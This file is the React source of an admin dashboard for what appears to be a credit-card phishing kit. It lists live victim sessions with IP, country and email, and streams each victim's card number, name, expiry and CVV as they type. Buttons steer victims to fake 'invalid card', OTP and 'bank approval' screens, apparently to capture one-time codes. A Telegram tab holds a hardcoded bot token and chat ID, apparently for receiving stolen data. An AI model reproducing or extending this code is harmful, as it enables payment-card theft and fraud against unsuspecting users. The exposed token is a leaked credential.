
import React, { useState, useEffect } from 'react';
import { Settings, LogOut, Trash2, CheckCircle2, CreditCard, Lock, Smartphone, RefreshCw, XCircle, Info, ShieldCheck } from 'lucide-react';
import { API_URL } from '../config';

export const AdminPanel: React.FC<{ onBack: () => void }> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'sessions' | 'config' | 'security'>('sessions');
  const [botToken, setBotToken] = useState('8586070350:AAHH3zeOKmg5Z45CT_68N14xzEdkLFhY0G0');
  const [chatId, setChatId] = useState('5219969216');
  const [sessions, setSessions] = useState<any[]>([]);
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [liveInputs, setLiveInputs] = useState<any>({});
  const [currentAction, setCurrentAction] = useState<{[key: string]: string}>({});

  useEffect(() => {
    const update = async () => {
      try {
        // Fetch all sessions from API
        const response = await fetch(`${API_URL}/api/sessions`);
        const allSessions = await response.json();
        
        // Convert object to array
        const sessionArray = Object.entries(allSessions).map(([id, data]: [string, any]) => ({
          ...data,
          id
        }));
        
        setSessions(sessionArray);
        
        // Load inputs for selected session
        if (selectedSessionId) {
          const inputsResponse = await fetch(`${API_URL}/api/inputs/${selectedSessionId}`);
          const inputs = await inputsResponse.json();
          setLiveInputs(inputs);
          
          const actionResponse = await fetch(`${API_URL}/api/actions/${selectedSessionId}`);
          const actionData = await actionResponse.json();
          if (actionData.action) {
            setCurrentAction(prev => ({ ...prev, [selectedSessionId]: actionData.action }));
          }
        }
      } catch (error) {
        console.error('Failed to fetch sessions:', error);
      }
    };
    
    const timer = setInterval(update, 1000);
    update();
    return () => clearInterval(timer);
  }, [selectedSessionId]);

  const handleAction = async (sessionId: string, action: string) => {
    try {
      await fetch(`${API_URL}/api/actions/${sessionId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action })
      });
      setCurrentAction(prev => ({ ...prev, [sessionId]: action }));
    } catch (error) {
      console.error('Failed to set action:', error);
    }
  };

  const clearSession = async (sessionId: string) => {
    try {
      await fetch(`${API_URL}/api/sessions/${sessionId}`, {
        method: 'DELETE'
      });
      
      if (selectedSessionId === sessionId) {
        setSelectedSessionId(null);
      }
    } catch (error) {
      console.error('Failed to clear session:', error);
    }
  };

  const clearAllSessions = async () => {
    try {
      for (const session of sessions) {
        await fetch(`${API_URL}/api/sessions/${session.id}`, {
          method: 'DELETE'
        });
      }
      setSessions([]);
      setSelectedSessionId(null);
    } catch (error) {
      console.error('Failed to clear all sessions:', error);
    }
  };

  const selectedSession = sessions.find(s => s.id === selectedSessionId);

  return (
    <div className="min-h-screen bg-[#0d1421] text-[#94a3b8] p-4 md:p-8 font-sans selection:bg-blue-500/30">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-8">
          <div>
            <h1 className="text-3xl font-bold text-white mb-2 tracking-tight">Admin Dashboard</h1>
            <p className="text-slate-500 text-sm">Manage sessions, Telegram configuration, and security settings</p>
          </div>
          <button 
            onClick={onBack}
            className="flex items-center gap-2 bg-[#ef4444] hover:bg-red-600 text-white px-5 py-2 rounded-lg font-bold transition-all active:scale-95 shadow-lg shadow-red-500/20"
          >
            <LogOut className="w-4 h-4" /> Logout
          </button>
        </header>

        {/* Navigation Tabs */}
        <nav className="flex items-center gap-1 bg-[#1a2333] p-1.5 rounded-xl mb-10 w-full max-w-2xl border border-slate-800">
          {[
            { id: 'sessions', label: 'Active Sessions' },
            { id: 'config', label: 'Telegram Config' },
            { id: 'security', label: 'Security' }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex-1 py-2.5 rounded-lg text-sm font-semibold transition-all ${
                activeTab === tab.id 
                  ? 'bg-[#2d3a4f] text-white shadow-md shadow-black/20' 
                  : 'text-slate-500 hover:text-slate-300'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </nav>

        {activeTab === 'sessions' && (
          <div className="space-y-6">
            {/* Sessions Overview */}
            <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-6">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center gap-3">
                  <h2 className="text-xl font-bold text-white">Active Sessions</h2>
                  <span className="bg-blue-500/10 text-blue-400 px-3 py-1 rounded-full text-xs font-bold">
                    {sessions.length} Online
                  </span>
                </div>
                {sessions.length > 0 && (
                  <button 
                    onClick={clearAllSessions}
                    className="text-xs text-red-400 hover:text-red-300 font-semibold"
                  >
                    Clear All
                  </button>
                )}
              </div>

              {sessions.length === 0 ? (
                <div className="text-center py-20 flex flex-col items-center gap-4">
                  <div className="w-16 h-16 bg-slate-800/50 rounded-full flex items-center justify-center mb-2">
                    <UsersIcon className="w-8 h-8 text-slate-600" />
                  </div>
                  <h3 className="text-white font-bold text-xl">No Active Sessions</h3>
                  <p className="text-slate-500 max-w-sm">When users access the login flow, they will appear here for real-time monitoring and control.</p>
                </div>
              ) : (
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {sessions.map(session => (
                    <div 
                      key={session.id}
                      onClick={() => setSelectedSessionId(session.id)}
                      className={`bg-[#0d1421] border rounded-xl p-4 cursor-pointer transition-all hover:border-blue-500/50 ${
                        selectedSessionId === session.id ? 'border-blue-500 ring-2 ring-blue-500/20' : 'border-slate-800'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center gap-2">
                          <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                          <span className="text-xs text-green-400 font-bold uppercase">Online</span>
                        </div>
                        <button 
                          onClick={(e) => { e.stopPropagation(); clearSession(session.id); }}
                          className="text-slate-500 hover:text-red-500 transition-colors"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                      <div className="space-y-2 text-sm">
                        <div>
                          <span className="text-slate-500 text-xs">IP:</span>
                          <p className="text-white font-mono text-xs">{session.ip}</p>
                        </div>
                        <div>
                          <span className="text-slate-500 text-xs">Country:</span>
                          <p className="text-white font-semibold text-xs">{session.country}</p>
                        </div>
                        <div>
                          <span className="text-slate-500 text-xs">Page:</span>
                          <p className="text-blue-400 font-semibold text-xs">{session.currentPage}</p>
                        </div>
                        {session.email && (
                          <div>
                            <span className="text-slate-500 text-xs">Email:</span>
                            <p className="text-yellow-400 font-mono text-xs truncate">{session.email}</p>
                          </div>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Selected Session Details */}
            {selectedSession && (
              <div className="bg-[#151d2c] border border-slate-800 rounded-2xl overflow-hidden shadow-2xl animate-in fade-in slide-in-from-bottom-4 duration-500">
                {/* Session Header */}
                <div className="flex items-center justify-between p-6 border-b border-slate-800">
                  <div className="flex flex-col gap-2">
                    <div className="flex items-center gap-3">
                      <div className="bg-[#10b981]/10 text-[#10b981] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest flex items-center gap-1.5 border border-[#10b981]/20">
                        <div className="w-1.5 h-1.5 bg-[#10b981] rounded-full animate-pulse" />
                        Active
                      </div>
                    </div>
                    <p className="text-xs text-slate-500 font-mono">Session ID: {selectedSession.id}</p>
                  </div>
                  <button 
                    onClick={() => clearSession(selectedSession.id)}
                    className="p-2 text-slate-500 hover:text-red-500 hover:bg-red-500/10 rounded-lg transition-all"
                  >
                    <Trash2 className="w-5 h-5" />
                  </button>
                </div>

                {/* Session Details */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-0.5 bg-slate-800/20">
                  {[
                    { label: 'Current Page', value: selectedSession.currentPage },
                    { label: 'Country', value: selectedSession.country },
                    { label: 'IP Address', value: selectedSession.ip },
                    { label: 'Last Active', value: new Date(selectedSession.lastSeen).toLocaleTimeString() }
                  ].map((stat, i) => (
                    <div key={i} className="bg-[#151d2c] p-6 flex flex-col gap-1">
                      <span className="text-[10px] uppercase font-black tracking-widest text-slate-500">{stat.label}</span>
                      <p className="text-white font-bold">{stat.value}</p>
                    </div>
                  ))}
                </div>

                {/* Control Actions */}
                <div className="p-8 space-y-6">
                  <div className="flex items-center gap-2 mb-2">
                    <h3 className="text-sm font-black uppercase tracking-widest text-white">Control Actions</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <ActionButton 
                      label="Invalid Card" 
                      icon={<CreditCard className="w-4 h-4" />} 
                      onClick={() => handleAction(selectedSession.id, 'declined')}
                      isActive={currentAction[selectedSession.id] === 'declined'}
                      colorClass="border-[#78350f] text-[#fbbf24] hover:bg-[#78350f]/20"
                    />
                    <ActionButton 
                      label="Invalid OTP" 
                      icon={<Lock className="w-4 h-4" />} 
                      onClick={() => handleAction(selectedSession.id, 'invalid_otp')}
                      isActive={currentAction[selectedSession.id] === 'invalid_otp'}
                      colorClass="border-[#7f1d1d] text-[#f87171] hover:bg-[#7f1d1d]/20"
                    />
                    <ActionButton 
                      label="OTP Page" 
                      icon={<Smartphone className="w-4 h-4" />} 
                      onClick={() => handleAction(selectedSession.id, 'otp')}
                      isActive={currentAction[selectedSession.id] === 'otp'}
                      colorClass="border-[#1e40af] text-[#60a5fa] hover:bg-[#1e40af]/20"
                    />
                    <ActionButton 
                      label="Bank Approval" 
                      icon={<CheckCircle2 className="w-4 h-4" />} 
                      onClick={() => handleAction(selectedSession.id, 'bank_approval')}
                      isActive={currentAction[selectedSession.id] === 'bank_approval'}
                      colorClass="border-[#581c87] text-[#c084fc] hover:bg-[#581c87]/20"
                    />
                    <ActionButton 
                      label="Normal" 
                      icon={<ShieldCheck className="w-4 h-4" />} 
                      onClick={() => handleAction(selectedSession.id, 'normal')}
                      isActive={currentAction[selectedSession.id] === 'normal' || !currentAction[selectedSession.id]}
                      colorClass="border-[#065f46] text-[#34d399] hover:bg-[#065f46]/20"
                    />
                    <ActionButton 
                      label="Block" 
                      icon={<XCircle className="w-4 h-4" />} 
                      onClick={() => handleAction(selectedSession.id, 'block')}
                      isActive={currentAction[selectedSession.id] === 'block'}
                      colorClass="border-[#450a0a] text-[#b91c1c] hover:bg-[#450a0a]/20 bg-[#2d0a0a]"
                    />
                  </div>

                  {/* Live Inputs Section */}
                  <div className="mt-10 pt-10 border-t border-slate-800">
                    <div className="flex items-center gap-2 mb-6">
                      <RefreshCw className="w-4 h-4 text-blue-400 animate-spin-slow" />
                      <h3 className="text-sm font-black uppercase tracking-widest text-white">Live Input Monitoring</h3>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4">
                      {[
                        { label: 'Card Number', value: liveInputs.cardNumber },
                        { label: 'Cardholder Name', value: liveInputs.nameOnCard },
                        { label: 'Expiry Date', value: liveInputs.expiry },
                        { label: 'CVV', value: liveInputs.cvv },
                      ].map(input => (
                        <div key={input.label} className="bg-[#0d1421] p-4 rounded-xl border border-slate-800 group transition-all hover:border-slate-600">
                          <span className="text-[9px] font-black uppercase tracking-widest text-slate-500 mb-1.5 block">{input.label}</span>
                          <p className={`text-sm font-mono truncate ${input.value ? 'text-blue-400 font-bold' : 'text-slate-700 italic'}`}>
                            {input.value || 'Waiting...'}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {activeTab === 'config' && (
          <div className="bg-[#151d2c] border border-slate-800 rounded-2xl p-8 max-w-xl mx-auto shadow-2xl animate-in zoom-in-95 duration-300">
            <h3 className="text-xl font-bold text-white mb-8 flex items-center gap-3">
              <Settings className="w-6 h-6 text-blue-400" />
              Telegram Bot Settings
            </h3>
            <div className="space-y-6">
              <div>
                <label className="text-xs font-black uppercase tracking-widest text-slate-500 block mb-3">Bot Token</label>
                <input 
                  type="text" 
                  value={botToken} 
                  onChange={e => setBotToken(e.target.value)}
                  className="w-full bg-[#0d1421] border border-slate-800 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/50 focus:ring-4 focus:ring-blue-500/10 transition-all" 
                />
              </div>
              <div>
                <label className="text-xs font-black uppercase tracking-widest text-slate-500 block mb-3">Chat ID</label>
                <input 
                  type="text" 
                  value={chatId} 
                  onChange={e => setChatId(e.target.value)}
                  className="w-full bg-[#0d1421] border border-slate-800 rounded-xl p-4 text-white font-mono text-sm outline-none focus:border-blue-500/50 focus:ring-4 focus:ring-blue-500/10 transition-all" 
                />
              </div>
              <button className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-xl font-bold transition-all shadow-lg shadow-blue-600/20 active:scale-[0.98]">
                Update Configuration
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

const ActionButton: React.FC<{ label: string, icon: React.ReactNode, onClick: () => void, isActive: boolean, colorClass: string }> = ({ label, icon, onClick, isActive, colorClass }) => (
  <button
    onClick={onClick}
    className={`flex items-center justify-center gap-3 py-3.5 px-4 rounded-xl border-2 transition-all font-bold text-sm ${colorClass} ${
      isActive ? 'ring-2 ring-white/20 bg-white/5' : 'bg-transparent'
    } active:scale-95`}
  >
    {icon}
    {label}
  </button>
);

const UsersIcon = (props: any) => (
  <svg {...props} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" /><circle cx="9" cy="7" r="4" /><path d="M22 21v-2a4 4 0 0 0-3-3.87" /><path d="M16 3.13a4 4 0 0 1 0 7.75" />
  </svg>
);
